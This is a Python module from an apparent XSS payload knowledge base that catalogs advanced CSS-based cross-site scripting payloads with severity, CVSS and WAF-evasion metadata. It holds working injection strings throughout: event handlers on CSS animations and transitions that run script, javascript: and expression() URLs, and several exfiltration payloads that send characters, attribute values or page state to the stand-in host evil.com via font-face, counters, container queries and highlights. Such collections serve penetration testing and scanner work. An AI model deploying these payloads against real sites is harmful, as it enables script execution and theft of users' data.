#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Active
Telegram: https://t.me/EasyProTech

Advanced CSS XSS Payloads
CSS animations, transitions, variables, imports, nesting, container queries, etc.
"""

from ..models import Encoding, PayloadEntry, Reliability, Severity


# === CSS Animation Payloads ===
CSS_ANIMATION_PAYLOADS = {
    "css-animation-name-injection": PayloadEntry(
        payload='<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>XSS</div>',
        contexts=["css_animation", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSS animation with onanimationstart event",
        tags=["css", "animation", "event", "keyframes"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-animation-end": PayloadEntry(
        payload='<style>@keyframes x{to{opacity:1}}</style><div style="animation:x .001s" onanimationend=alert(1)>XSS</div>',
        contexts=["css_animation", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSS animation onanimationend for fast trigger",
        tags=["css", "animation", "animationend", "fast"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-animation-iteration": PayloadEntry(
        payload='<style>@keyframes x{to{opacity:1}}</style><div style="animation:x .001s infinite" onanimationiteration=alert(1)>XSS</div>',
        contexts=["css_animation", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSS animation iteration event",
        tags=["css", "animation", "iteration", "infinite"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Transition Payloads ===
CSS_TRANSITION_PAYLOADS = {
    "css-transition-trigger": PayloadEntry(
        payload='<style>.x{width:0}.x:hover{width:100px}</style><div class=x ontransitionend=alert(1) style="transition:width .001s">XSS</div>',
        contexts=["css_transition", "html_content", "css"],
        severity=Severity.HIGH,
        cvss_score=7.0,
        description="CSS transition with ontransitionend event",
        tags=["css", "transition", "event", "hover"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-transition-start": PayloadEntry(
        payload='<div ontransitionstart=alert(1) style="transition:all .001s;width:0" id=x></div><script>x.style.width="1px"</script>',
        contexts=["css_transition", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSS transition start event auto-trigger",
        tags=["css", "transition", "transitionstart", "auto"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-transition-run": PayloadEntry(
        payload='<div ontransitionrun=alert(1) style="transition:all .001s;width:0" id=x></div><script>x.style.width="1px"</script>',
        contexts=["css_transition", "html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="CSS transition run event",
        tags=["css", "transition", "transitionrun"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Variables (Custom Properties) Payloads ===
CSS_VARIABLES_PAYLOADS = {
    "css-var-url-injection": PayloadEntry(
        payload="<style>:root{--x:url(javascript:alert(1))}.y{background:var(--x)}</style><div class=y>XSS</div>",
        contexts=["css_variables", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS variable with javascript URL (legacy)",
        tags=["css", "variables", "custom-properties", "url"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-var-expression": PayloadEntry(
        payload="<style>:root{--x:expression(alert(1))}.y{width:var(--x)}</style><div class=y>XSS</div>",
        contexts=["css_variables", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS variable with expression (IE only)",
        tags=["css", "variables", "expression", "ie"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-var-font-face": PayloadEntry(
        payload='<style>:root{--font:url("https://evil.com/xss")}@font-face{font-family:x;src:var(--font)}</style>',
        contexts=["css_variables", "css_font_face", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS variable in font-face for data exfil",
        tags=["css", "variables", "font-face", "exfil"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS @import Payloads ===
CSS_IMPORT_PAYLOADS = {
    "css-import-external": PayloadEntry(
        payload='<style>@import url("https://evil.com/xss.css");</style>',
        contexts=["css_import", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=6.0,
        description="CSS @import external stylesheet",
        tags=["css", "import", "external", "stylesheet"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
    "css-import-data": PayloadEntry(
        payload='<style>@import url("data:text/css,*{background:url(javascript:alert(1))}");</style>',
        contexts=["css_import", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS @import with data URL",
        tags=["css", "import", "data-url"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-import-chain": PayloadEntry(
        payload='<style>@import url("xss1.css");@import url("xss2.css");</style>',
        contexts=["css_import", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS @import chaining for CSS injection",
        tags=["css", "import", "chain", "multiple"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=False,
    ),
}

# === CSS @font-face Payloads ===
CSS_FONT_FACE_PAYLOADS = {
    "css-font-face-exfil": PayloadEntry(
        payload='<style>@font-face{font-family:x;src:url("https://evil.com/log?char=a");unicode-range:U+0061}</style><div style="font-family:x">a</div>',
        contexts=["css_font_face", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.5,
        description="CSS font-face for character exfiltration",
        tags=["css", "font-face", "exfil", "unicode-range"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-font-face-svg": PayloadEntry(
        payload="<style>@font-face{font-family:x;src:url(\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>\")}</style>",
        contexts=["css_font_face", "html_content", "css", "svg"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS font-face with SVG payload",
        tags=["css", "font-face", "svg", "data-url"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Counters Payloads ===
CSS_COUNTER_PAYLOADS = {
    "css-counter-content": PayloadEntry(
        payload='<style>.x::before{counter-increment:c;content:url("https://evil.com/?c=" attr(data-s))}</style><div class=x data-s="secret">XSS</div>',
        contexts=["css_counter", "html_content", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS counter with data exfiltration",
        tags=["css", "counter", "content", "exfil"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-counter-style": PayloadEntry(
        payload='<style>@counter-style x{system:cyclic;symbols:url("javascript:alert(1)")}</style>',
        contexts=["css_counter", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS @counter-style with URL",
        tags=["css", "counter-style", "url"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Nesting Payloads ===
CSS_NESTING_PAYLOADS = {
    "css-nesting-selector": PayloadEntry(
        payload='<style>.x{&:hover{background:url("javascript:alert(1)")}}</style><div class=x>XSS</div>',
        contexts=["css_nesting", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS nesting with javascript URL",
        tags=["css", "nesting", "selector", "hover"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-nesting-deep": PayloadEntry(
        payload='<style>.a{.b{.c{.d{background:url("https://evil.com/log")}}}}</style>',
        contexts=["css_nesting", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="Deep CSS nesting for obfuscation",
        tags=["css", "nesting", "deep", "obfuscation"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Cascade Layers Payloads ===
CSS_CASCADE_LAYERS_PAYLOADS = {
    "css-layer-override": PayloadEntry(
        payload='<style>@layer base,override;@layer override{*{background:url("javascript:alert(1)")}}</style>',
        contexts=["css_cascade_layers", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS cascade layer override",
        tags=["css", "layer", "cascade", "override"],
        reliability=Reliability.LOW,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
    "css-layer-import": PayloadEntry(
        payload='<style>@import url("evil.css") layer(override);</style>',
        contexts=["css_cascade_layers", "css_import", "css"],
        severity=Severity.MEDIUM,
        cvss_score=5.0,
        description="CSS layer with external import",
        tags=["css", "layer", "import", "external"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Container Queries Payloads ===
CSS_CONTAINER_QUERIES_PAYLOADS = {
    "css-container-query-exfil": PayloadEntry(
        payload='<style>.c{container-type:inline-size}@container(min-width:100px){.x{background:url("https://evil.com/w100")}}</style><div class=c><div class=x>XSS</div></div>',
        contexts=["css_container_queries", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=4.0,
        description="CSS container query for size detection",
        tags=["css", "container", "query", "size"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS @scope Payloads ===
CSS_SCOPE_PAYLOADS = {
    "css-scope-injection": PayloadEntry(
        payload='<style>@scope(.x){:scope{background:url("https://evil.com/scoped")}}</style><div class=x>XSS</div>',
        contexts=["css_scope", "html_content", "css"],
        severity=Severity.LOW,
        cvss_score=3.0,
        description="CSS @scope for targeted styling",
        tags=["css", "scope", "targeted", "injection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# === CSS Custom Highlight Payloads ===
CSS_CUSTOM_HIGHLIGHT_PAYLOADS = {
    "css-highlight-exfil": PayloadEntry(
        payload='<style>::highlight(search){background:url("https://evil.com/found")}</style><script>CSS.highlights.set("search",new Highlight(range))</script>',
        contexts=["css_custom_highlight", "html_content", "css", "javascript"],
        severity=Severity.LOW,
        cvss_score=4.0,
        description="CSS custom highlight API for detection",
        tags=["css", "highlight", "api", "detection"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
    ),
}

# Combined database
CSS_ADVANCED_PAYLOADS = {
    **CSS_ANIMATION_PAYLOADS,
    **CSS_TRANSITION_PAYLOADS,
    **CSS_VARIABLES_PAYLOADS,
    **CSS_IMPORT_PAYLOADS,
    **CSS_FONT_FACE_PAYLOADS,
    **CSS_COUNTER_PAYLOADS,
    **CSS_NESTING_PAYLOADS,
    **CSS_CASCADE_LAYERS_PAYLOADS,
    **CSS_CONTAINER_QUERIES_PAYLOADS,
    **CSS_SCOPE_PAYLOADS,
    **CSS_CUSTOM_HIGHLIGHT_PAYLOADS,
}

CSS_ADVANCED_TOTAL = len(CSS_ADVANCED_PAYLOADS)
